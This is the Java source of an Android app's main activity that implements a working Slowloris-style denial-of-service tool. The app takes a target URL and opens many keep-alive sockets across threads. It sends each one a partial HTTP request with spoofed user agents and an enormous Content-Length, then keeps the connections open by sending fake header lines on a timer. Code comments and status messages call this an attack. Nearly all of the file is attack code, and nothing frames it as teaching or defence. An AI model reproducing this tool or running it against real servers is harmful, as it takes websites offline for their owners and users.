package com.tskp.slack;

import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.app.Dialog;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.material.floatingactionbutton.FloatingActionButton;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Random;

public class MainActivity extends AppCompatActivity {

    private String TAG = "Main Activity";

    private EditText ourIP, sockets, portEt, delay, spt;
    private EditText targetET;
    private FloatingActionButton startFab, settingsFab;
    private TextView countTv, stateTv;
    private Button done;

    private String host;

    private int socketsNum = 200;//default
    private int port = 80;//default http port

    private long sleep = 10000; //15 secs default sleep

    private ExternalIP asyncExtIp;
    private Slack slackTask;

    private MatrixView matrixView;

    private boolean running = false;

    String counterText;

    private int SOCKETS_PER_THREAD = 50;

    String[] agents = {"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"};


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        asyncExtIp = new ExternalIP();

        ourIP = findViewById(R.id.ourIP);
        targetET = findViewById(R.id.target);
        startFab = findViewById(R.id.startFab);
        settingsFab = findViewById(R.id.settingsFab);
        matrixView = findViewById(R.id.mv);
        countTv = findViewById(R.id.sCount);
        stateTv = findViewById(R.id.statusTv);

        asyncExtIp.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);// Load our external IP

        counterText = getString(R.string.count_string) + "  ";

        countTv.setText(counterText + "0");

        startFab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if (!running) {
                    String url = targetET.getText().toString();
                    Log.d(TAG, url);
                    if (!url.equals("")) {
                        hideSoftKeyboard();
                        slackTask = new Slack();
                        String targetPrefix = url.startsWith("http://") ? "" : "http://";
                        host = targetPrefix + url;
                        slackTask.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
                        startFab.setImageDrawable(getDrawable(R.drawable.baseline_close_white_48));
                        running = true;
                    }
                } else {
                    updateStatusText(279);
                    startFab.setEnabled(false);
                    slackTask.cancel(true);
                    running = false;
                }
            }
        });

        final Dialog dialog = new Dialog(this);
        dialog.setContentView(R.layout.dialogue_box);
        sockets = dialog.findViewById(R.id.sockets);
        portEt = dialog.findViewById(R.id.port);
        delay = dialog.findViewById(R.id.delay);
        spt = dialog.findViewById(R.id.spt);
        done = dialog.findViewById(R.id.done);

        done.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String sox = sockets.getText().toString();
                String por = portEt.getText().toString();
                String del = delay.getText().toString();
                String sokpt = spt.getText().toString();

                try {
                    socketsNum = Integer.parseInt(sox);
                }catch (NumberFormatException e){
                }

                try {
                    port = Integer.parseInt(por);
                }catch (NumberFormatException e){
                }

                try {
                    sleep = Integer.parseInt(del);
                }catch (NumberFormatException e){
                }

                try {
                    SOCKETS_PER_THREAD = Integer.parseInt(sokpt);
                }catch (NumberFormatException e){
                }

                dialog.dismiss();

            }
        });

        settingsFab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                dialog.show();
            }
        });

        settingsFab.setOnLongClickListener(new View.OnLongClickListener() {
            @Override
            public boolean onLongClick(View view) {
                Intent intent = new Intent(MainActivity.this, MainActivity.class);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_DOCUMENT |
                        Intent.FLAG_ACTIVITY_NEW_TASK |
                        Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
                intent.addCategory(Intent.CATEGORY_LAUNCHER);
                startActivity(intent);
                return true;
            }
        });
    }

    public void hideSoftKeyboard() {
        InputMethodManager inputMethodManager =
                (InputMethodManager) this.getSystemService(
                        Activity.INPUT_METHOD_SERVICE);
        inputMethodManager.hideSoftInputFromWindow(
                this.getCurrentFocus().getWindowToken(), 0);
    }

    private void updateMatrixView(int[] states, int count) {
        countTv.setText(counterText + count);
        if (matrixView != null) {
            matrixView.updateSocketStates(states);
        }
    }

    String stateString = "s t a t u s  :  ";

    private void updateStatusText(int state){
        switch (state){
            case 1:
                stateTv.setText(stateString + "CREATING SOCKET");
                break;
            case 2:
                stateTv.setText(stateString + "SOCKET CREATED ");
                break;
            case 10:
                stateTv.setText(stateString + "SENDING FAKE PAYLOAD");
                break;
            case 69:
                stateTv.setText(stateString + "SLEEP: 10 Seconds");
                break;
            case 420:
                stateTv.setText(stateString + "IDLE");
                break;
            case 279:
                stateTv.setText(stateString + "CLOSING SOCKETS");
        }
    }

    private void onStopped() {
        startFab.setImageDrawable(getDrawable(R.drawable.baseline_play_arrow_white_48));
        startFab.setEnabled(true);
    }

    private class Slack extends AsyncTask<Void, Void, Void> {
        /**
         * 0 - Grey  - null socket
         * 1 - Red - Creating socket
         * 2 - Green - Socket open and running
         * 10 - White flash - Socket pinged
         */

        int[] states;

        URL targetURL;

        String[] requestArray;

        Socket[] sockets = new Socket[socketsNum];
        int socketsCreated = 0;

        InetSocketAddress address;

        @Override
        protected void onPreExecute() {
            states = new int[socketsNum];

            matrixView.init(states, socketsNum);

            try {
                targetURL = new URL(host);
            } catch (MalformedURLException e) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        Toast.makeText(getApplicationContext(), "Check URL!", Toast.LENGTH_SHORT).show();
                    }
                });
                e.printStackTrace();
                return;
            }

            requestArray = createInitialPartialRequests();

            Log.d(TAG, "Executing on: " + host + " : " + port);

        }

        private void stateChanged(final int index, final int state) {
            if(index < states.length) { // Prevent ArrayIndexOutOfBounds Exception
                states[index] = state;
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        updateMatrixView(states, socketsCreated);
                        updateStatusText(state);
                    }
                });
            }
        }

        private void createSocket(int i) throws IOException {
            stateChanged(i, 1);

            Socket socket = new Socket();
            socket.setKeepAlive(true);
            sockets[i] = socket;

            socket.connect(address);
            sendPartialRequest(i);

            stateChanged(i, 2);

        }

        private String[] createInitialPartialRequests() {
            String pagePrefix = "/";
            if (targetURL.getPath().startsWith("/"))
                pagePrefix = "";

            String type = "GET " + pagePrefix + targetURL.getPath() + " HTTP/1.1\r\n";
            String host = "Host: " + targetURL.getHost() + (port == 80 ? "" : ":" + port) + "\r\n";
            String contentType = "Content-Type: */* \r\n";
            String connection = "Connection: keep-alive\r\n";



            String[] allPartials = new String[socketsNum];
            for (int i = 0; i < socketsNum; i++)
                allPartials[i] = type + host + contentType + connection + agents[new Random().nextInt(agents.length)] + "\r\n";

            return allPartials;
        }

        private void socketClosed(int index) {
            stateChanged(index, 0);
        }

        BufferedWriter writer;

        private void sendPartialRequest(int index) {
            try {
                /*String req = requestArray[new Random().nextInt(socketsNum)];
                sockets[index].getOutputStream().write(req.getBytes()); // write a random partial HTTP GET request to the server
                */

                writer = new BufferedWriter(new OutputStreamWriter(
                        sockets[index].getOutputStream(), StandardCharsets.UTF_8));
                writer.write("GET / HTTP/1.1\r\n");
                writer.write("Host: " + targetURL.getHost() + " \r\n");
                writer.write("User-agent:" + agents[new Random().nextInt(agents.length)] + "\r\n");
                writer.write("Content-Length: " + Integer.MAX_VALUE + "\r\n");
                writer.write("Connection:close\r\n");
                writer.write("X-a:\r\n");
                writer.flush();


            } catch (IOException ioe) {
                Log.e(TAG, "Partial request failed!");
                ioe.printStackTrace();
            }
        }

        private boolean sendFalseHeaderField(int index) {
            try {
                writer = new BufferedWriter(new OutputStreamWriter(
                        sockets[index].getOutputStream(), StandardCharsets.UTF_8));
                writer.write("X-a:b\r\n");
                writer.flush();

                //stateChanged(index, 10);
                return true;
            } catch (IOException ioe) {
                Log.e(TAG, "False request failed: Restarting connection!");
                try {
                    createSocket(index);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                ioe.printStackTrace();
                return false;
            }
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);

        }

        @Override
        protected Void doInBackground(Void... voids) {

            address = new InetSocketAddress(targetURL.toExternalForm().replace("http://", ""), port);

            createSockets();

            boolean check = false;
            while(!check){
                check = true;
                for(int i = 0; i<threadCbArray.length; i++){
                    check = check & threadCbArray[i];
                }
            }

            Log.d(TAG, "All threads finished creation!");

            // Attack
            while (true) {
                if (!isCancelled()) {

                    Log.d(TAG, "Sending false headers...");
                    for (int i = 0; i < socketsCreated; i++) {
                        if (!isCancelled())
                            if(sockets[i] != null) {
                                if (sockets[i].isConnected())
                                    sendFalseHeaderField(i);
                            }
                    }

                    try {
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                updateStatusText(69);
                            }
                        });
                        Log.d(TAG, "Sleep");
                        Thread.sleep(sleep);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                } else {
                    Log.d(TAG, "Stopping attack...");
                    closeAllConnections();
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            onStopped();
                        }
                    });
                    return null;
                }
            }

        }
        private Random intRandom = new Random();

        private boolean[] threadCbArray;
        private int f;

        private void createSockets() {
            int numThreads = socketsNum / SOCKETS_PER_THREAD;
            numThreads += ((socketsNum % SOCKETS_PER_THREAD) == 0) ? 0 : 1;

            threadCbArray = new boolean[numThreads];

            for(f=0; f<numThreads; f++){

                new Thread(new Runnable() {
                    int cbIndex = f;
                    @Override
                    public void run() {

                        Log.d(TAG, "Start Thread! " + cbIndex);

                        for(int i=0; i< SOCKETS_PER_THREAD; ){
                            if(!isCancelled()) {
                                int targetIndex = intRandom.nextInt(socketsNum);

                                if(states[targetIndex] == 0) {
                                    try {
                                        createSocket(targetIndex);

                                        socketsCreated++;
                                        i++;
                                    } catch (IOException e) {
                                        sockets[targetIndex] = null;
                                        //e.printStackTrace();
                                        threadCbArray[cbIndex] = true;
                                        break;
                                    }
                                }
                            }else
                                break;
                        }
                        threadCbArray[cbIndex] = true;

                        Log.d(TAG, "Kill Thread! " + cbIndex);

                    }
                }).start();

            }

        }

        @Override
        protected void onCancelled() {
        }

        private void closeAllConnections() {
            Log.e(TAG, "Closing all connections...");
            for (int i = 0; i < socketsNum; i++) {
                try {
                    if (sockets[i] != null) {
                        if (sockets[i].isConnected()) {
                            sockets[i].getOutputStream().write("\r\n".getBytes());
                            sockets[i].close();
                        }
                        socketClosed(i);
                    }
                } catch (IOException ioe) {
                    ioe.printStackTrace();
                }
            }
            states = new int[0];
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    updateMatrixView(states, 0);
                    updateStatusText(420);
                }
            });
        }
    }

    private class ExternalIP extends AsyncTask<Void, Void, String> {

        @Override
        protected void onPreExecute() {

        }

        protected String doInBackground(Void... urls) {
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    stateTv.setText(stateString + "OBTAINING EXTERNAL IP");
                }
            });

            String ip = "Empty";
            try {
                URL url = new URL("https://wtfismyip.com/text");
                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();

                if (urlConnection.getResponseCode() == HttpURLConnection.HTTP_OK) {
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
                    ip = bufferedReader.readLine();
                    bufferedReader.close();
                }

                urlConnection.disconnect();

            } catch (Exception e) {
                ip = "Error";
                e.printStackTrace();
            }

            Log.d(TAG, "IP: " + ip);

            return ip;
        }

        protected void onPostExecute(final String result) {
            // External IP
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    ourIP.setText(result);
                    updateStatusText(420);
                }
            });
        }
    }
}
